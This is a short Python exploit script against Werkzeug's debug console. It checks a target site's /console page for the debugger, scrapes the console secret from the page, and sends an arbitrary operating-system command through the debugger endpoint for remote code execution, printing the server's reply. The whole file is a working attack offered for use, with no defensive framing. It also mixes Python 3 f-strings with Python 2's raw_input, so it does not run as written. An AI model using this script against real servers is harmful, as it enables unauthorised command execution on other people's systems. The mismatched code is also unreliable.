#!/usr/bin/env python

import requests
import sys
import re
import urllib

if len(sys.argv) != 3:
    print(f"USAGE: python2 {sys.argv[0]} <website> <cmd>")
    sys.exit(-1)

response = requests.get(f'http://{sys.argv[1]}/console')

if "Werkzeug powered traceback interpreter" not in response.text:
    print("[-] Debug is not enabled")
    sys.exit(-1)

cmd = f'''__import__('os').popen(\'{sys.argv[2]}\').read();'''

response = requests.get(f'http://{sys.argv[1]}/console')

secret = re.findall("[0-9a-zA-Z]{20}",response.text)

if len(secret) != 1:
    print("[-] Couldn't get the SECRET")
    sys.exit(-1)
else:
    secret = secret[0]
    print(f"[+] SECRET is: {str(secret)}")

print(f"[+] Script will try executing {sys.argv[2]} on {sys.argv[1]}") 

raw_input("Press any key to execute")

response = requests.get(f"http://{sys.argv[1]}/console?__debugger__=yes&cmd={str(cmd)}&frm=0&s={secret}")

print("[+] response from server")
print(f"status code: {str(response.status_code)}")
print(f"response: {str(response.text)}")
